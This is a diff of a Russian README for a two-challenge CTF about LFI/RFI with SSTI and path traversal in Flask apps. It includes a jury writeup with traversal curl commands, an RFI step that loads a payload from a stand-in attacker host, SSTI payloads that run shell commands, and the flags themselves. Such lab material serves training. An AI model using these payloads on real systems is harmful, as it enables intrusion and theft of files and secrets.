@@ -1,124 +1,156 @@
-# CTF «Тёмный архив „Мнемозина“» — 2 задания (OWASP Top 10)
+# CTF: Old Observatory — two OWASP Top 10 web challenges
 
-## Легенда (общая для обоих заданий)
+Два FLASK-приложения с общей легендой («Старая Обсерватория»), каждое со
+своей уязвимостью из OWASP Top 10. Флаг — уникальная строка, зашитая в код
+приложения (и продублированная в файле вне web-root, до которого нужно
+дотянуться через уязвимость).
 
-> Корпорация **«Мнемозина»** хранила свои секретные разработки в закрытом
-> «Тёмном архиве» — веб-портале документооборота. После утечки сотрудников
-> портал был законсервирован, но доступ к нему остался: два сервиса крутятся
-> в Docker и ничего не подозревают о наблюдателях…
->
-> Ходят слухи, что главный архиварь зашил в код приложения **мастер-ключ**
-> (флаг формата `FLAG{...}`), а все действия посетителей незаметно пишутся
-> в отдельную базу аудита. Найдите уязвимость, используйте её — и заберите
-> мастер-ключ.
+| Задание | Уязвимость | OWASP | Порт |
+|---|---|---|---|
+| `challenge-lfi` — Archive Portal | **LFI + RFI** (+ SSTI-цепочка) | A03:2021 Injection | **5050** |
+| `challenge-traversal` — Supply Depot | **Path Traversal** | A01:2021 Broken Access Control | **5051** |
 
-Игрокам выдаётся только интерфейс двух приложений. Всё остальное —
-разведка (fingerprinting, эвристический анализ параметров, чтение кода
-приложения после получения RCE).
+Оба приложения пишут **каждое действие пользователя** в отдельную SQLite
+БД `userlog.db`, которая монтируется через volume (`./logs/lfi` и
+`./logs/traversal`).
 
----
+## Запуск
 
-## Задание 1 — port `5050`, уязвимость **LFI / RFI** (OWASP A03:2021 Injection)
+```bash
+docker compose up --build -d
+# http://localhost:5050  -> задание 1 (LFI/RFI)
+# http://localhost:5051  -> задание 2 (Path Traversal)
+```
 
-| | |
-|---|---|
-| Точка входа | `GET /render?page=<имя страницы>` |
-| Уязвимость №1 | **Local File Inclusion**: `page` подставляется в путь без фильтра → `php://`-подобная классика, но на Flask — инклюз локальных файлов с исполнением Jinja (`render_template(..., {{ ''|popen('id') }}))` не нужен; достаточно `templates/` + `?page=` обхода и `{{ config }}` SSTI в инклюде, либо прямой LFI через абсолютный путь) |
-| Уязвимость №2 (бонус) | **Remote File Inclusion**: `POST /fetch?url=` загружает внешний шаблон из «филиала» и рендерит его — игрок поднимает свой HTTP-сервер с шаблоном, содержащим `{{ ''.__class__.__mro__[1].__subclasses__() }}` / RCE payload |
-| Как получить флаг | Флаг зашит в `/app/secret_flag.py` (импортируется в `app.py`). Через LFI+RCE (`os.popen('cat /app/secret_flag.py')`) или через чтение исходников (`source_code` endpoint отсутствует — читать надо LFI: `../app/secret_flag.py`) |
-| Прямой reading | `?page=/proc/self/environ` покажет переменные окружения (подсказка про БД аудита) |
+Логи действий:
 
-### Решение (writeup для жюри)
+```bash
+sqlite3 logs/lfi/userlog.db       "SELECT * FROM user_actions ORDER BY id DESC LIMIT 20;"
+sqlite3 logs/traversal/userlog.db "SELECT * FROM user_actions ORDER BY id DESC LIMIT 20;"
+```
 
-1. Разведка: параметр `page` явно включает страницы (`/?page=home`).
-2. Пробуем `/?page=../../etc/passwd` → файл существует, но включается как
-   Jinja-шаблон — вывод виден. Это **LFI**.
-3. Jinja-шаблон исполняется ⇒ **SSTI внутри LFI**:
-   `/?={{ ''.__class__.__mro__[1].__subclasses__() }}` — но безопаснее пройти
-   через `config`: игрок пишет свой шаблон нельзя… поэтому используем второй
-   вектор — **RFI**:
-4. `POST /fetch?url=http://<VPS>/evil.tpl` — сервер скачивает удалённый
-   шаблон и рендерит его. В `evil.tpl`:
-   ```jinja
-   {% import os as o %}  -- не нужно; достаточно:
-   {{ cycler.__init__.__globals__.os.popen('cat /app/secret_flag.py').read() }}
-   ```
-5. Флаг печатается в ответе.
+Таблица: `ts, ip, method, path, query, user_agent, action, detail`.
 
-*(Либо короче: LFI + SSTI напрямую в параметре `page`, т.к. значение
-подставляется в `render_template_string("..."+page_content)` — см. код.)*
+## Флаги
+
+* Задание 1: `FLAG{lfi_0bs3rv4t0ry_ch4rt3d_c0m3t_7f9x}`
+* Задание 2: `FLAG{p4th_tr4vers4l_d3p0t_v4ult_51z3_42}`
+
+Проверка второго флага — эндпоинт `POST /flag-check` (form или JSON `{"flag": "..."}`).
 
 ---
 
-## Задание 2 — port `5051`, уязвимость **PATH TRAVERSAL** (OWASP A01:2021 Broken Access Control)
+# Как эксплуатировать (writeup для жюри)
 
-| | |
-|---|---|
-| Точка входа | `GET /files/<filename>` — «выдача документов архива по имени» |
-| Защита «для вида» | запрещены подстроки `..`, `/`, `%2e%2e`… **но** фильтр не проверяет URL-кодирование двойного слоя и не канонализирует путь; кроме того, разрешён запрос через заголовок `X-Doc-Name` (обход через **absolute path** `/app/...`, где `..` не нужен) |
-| Как получить флаг | Флаг зашит в `/app/secret_flag.py`. Игрок читает исходники трассировкой: `/files/%2e%61%70%70%2fsecret_flag.py`… Реальный оффициальный путь решения: двойное URL-кодирование (`%252e%252e`) проходит фильтр один раз декодируясь Werkzeug'ом → traversal работает |
-| Дополнительно | `/files/../instance/audit.db` — игроки находят базу аудита и видят **логи всех своих же действий** (подсказка легенды) |
+## Задание 1 — LFI / RFI (порт 5050)
 
-### Решение (writeup для жюри)
+### Вектор 1: Local File Inclusion через `/page?file=`
 
-1. `/files/report_2024.txt` отдаёт файлы из `docs/`.
-2. `/files/../app.py` → 403 (фильтр `..`).
-3. `/files/%252e%252e/app.py` → после декодирования Werkzeug остаётся
-   `%2e%2e` → приложение декодирует **ещё раз** (`unquote`) и получает `..` —
-   **Path Traversal**. Читается `app.py`, в нём `from secret_flag import FLAG`.
-4. `/files/%252e%252e/secret_flag.py` → **флаг**.
+Эндпоинт делает `os.path.join(PAGES_DIR, name)` без проверки выхода за
+каталог. Игрок замечает это по подсказке в `/page?file=help.html`
+(«never let the shelf path escape ../ territory»).
 
----
+Прочитать исходник приложения, где зашит флаг:
 
-## База аудита (общие требования)
+```bash
+curl "http://localhost:5050/page?file=../app.py" | grep FLAG
+```
 
-Каждое приложение пишет **любые** действия пользователя (метод, путь,
-параметры, query-строка, заголовки User-Agent / X-Forwarded-For, тело до
-2 КБ, IP, timestamp) в SQLite-базу, лежащую на volume:
+Прочитать флаг-файл вне web-root (в контейнере он лежит в /opt/secrets):
 
-* задание 1 → `./logs_chall1/audit.db` (в контейнере `/data/audit.db`)
-* задание 2 → `./logs_chall2/audit.db` (в контейнере `/data/audit.db`)
+```bash
+curl "http://localhost:5050/page?file=../../opt/secrets/flag.txt"
+```
 
-Схема: `actions(id, ts, ip, method, path, query, headers, body, ua)`.
+Классические разведочные запросы:
 
-Браузер игрока может посмотреть свои же логи через `/audit/recent`
-(последние 20 записей) — это и подсказка, и «самопроверка» детекции.
+```bash
+curl "http://localhost:5050/page?file=../../../../etc/passwd"
+curl "http://localhost:5050/page?file=../../../../proc/self/environ"   # env, LOG_DB, пути
+```
 
----
+Итог: `FLAG{lfi_0bs3rv4t0ry_ch4rt3d_c0m3t_7f9x}`.
+
+### Вектор 2: Remote File Inclusion через `/lang?src=<url>`
+
+Сервер сам загружает язык-пак по URL от игрока и рендерит его содержимое
+как Jinja-шаблон (RFI → SSTI цепочка).
+
+1. Игрок поднимает свой HTTP-сервер с payload'ом:
+
+```bash
+echo '{{ config["SECRET_FLAG"] }}' > pack.txt
+python3 -m http.server 8080
+```
+
+2. Заставляет приложение загрузить удалённый файл:
+
+```bash
+curl "http://localhost:5050/lang?src=http://ATTACKER:8080/pack.txt"
+# в ответе отрендерится FLAG{lfi_0bs3rv4t0ry_ch4rt3d_c0m3t_7f9x}
+```
+
+Более жёсткий RFI/SSTI-payload (чтение файла серверной стороной):
+
+```
+{{ ''.__class__.__mro__[1].__subclasses__() }}          # перечислить классы
+{{ cycler.__init__.__globals__.os.popen('cat /opt/secrets/flag.txt').read() }}
+```
+
+Оба вектора фиксируются в БД-логе действиями `page_view`, `rfi_fetch`.
+
+## Задание 2 — Path Traversal (порт 5051)
+
+### Эксплуатация `/download?file=`
+
+Эндпоинт отдаёт файлы из `warehouse/public`, но путь строится как
+`os.path.join(PUBLIC_DIR, name)` без нормализации/проверки containment.
+На главной странице есть подсказка: «internal paperwork lives in ../vault».
+
+Прямо прочитать флаг из хранилища:
+
+```bash
+curl "http://localhost:5051/download?file=../vault/flag.txt"
+# -> FLAG{p4th_tr4vers4l_d3p0t_v4ult_51z3_42}
+```
+
+Прочитать исходник приложения (флаг зашит в коде):
+
+```bash
+curl "http://localhost:5051/download?file=../../app.py" | grep FLAG
+```
+
+ДругиеInteresting цели в контейнере:
+
+```bash
+curl "http://localhost:5051/download?file=../../../../../etc/passwd"
+curl "http://localhost:5051/download?file=../../../opt/depot-vault/master.key"
+curl "http://localhost:5051/download?file=../vault/security_notes.txt"   # decoy-документ
+```
+
+Обход фильтров (если бы `%2e%2e` резались — полезная практика для игроков):
+
+```bash
+curl "http://localhost:5051/download?file=..%2f..%2fvault%2fflag.txt"
+curl "http://localhost:5051/download?file=....//vault/flag.txt"
+```
+
+Отправка флага на проверку:
+
+```bash
+curl -X POST -H 'Content-Type: application/json' \
+     -d '{"flag":"FLAG{p4th_tr4vers4l_d3p0t_v4ult_51z3_42}"}' \
+     http://localhost:5051/flag-check
+```
+
+Все шаги попадают в `logs/traversal/userlog.db` (`download_try`,
+`download_ok`, `flag_check`) — организатор видит ход решения.
 
 ## Структура проекта
 
 ```
-.
-├── docker-compose.yml
-├── README.md
-├── task_description.md          # текст заданий для игроков
-├── chall1_lfi_rfi/              # :5050 — LFI/RFI (A03 Injection)
-│   ├── Dockerfile
-│   ├── app.py
-│   ├── secret_flag.py           # FLAG{...} — генерируется build-аргом
-│   └── templates/
-│       ├── home.html / about.html / contact.html / error.html
-├── chall2_path_traversal/       # :5051 — Path Traversal (A01)
-│   ├── Dockerfile
-│   ├── app.py
-│   ├── secret_flag.py
-│   └── docs/
-│       ├── report_2024.txt / memo_internal.txt / readme.txt
-├── logs_chall1/                 # volume: audit.db (чалл 1)
-└── logs_chall2/                 # volume: audit.db (чалл 2)
+docker-compose.yml
+challenge-lfi/        app.py Dockerfile requirements.txt pages/ langs/
+challenge-traversal/  app.py Dockerfile requirements.txt warehouse/{public,vault}/
+logs/{lfi,traversal}/ <- volumes с SQLite-БД пользовательских действий
 ```
-
-## Запуск / проверка
-
-```bash
-docker compose up -d --build
-curl http://localhost:5050/
-curl http://localhost:5051/files/readme.txt
-#_sol_
-python3 solve_chall1.py   # RFI-эксплойт (локальный HTTP-сервер + fetch)
-python3 solve_chall2.py   # double-encoded traversal
-```
-
-Флаги уникальны: генерируются при сборке (`--build-arg FLAG=FLAG{...}`),
-либо задайте их вручную в `secret_flag.py` перед публикацией.
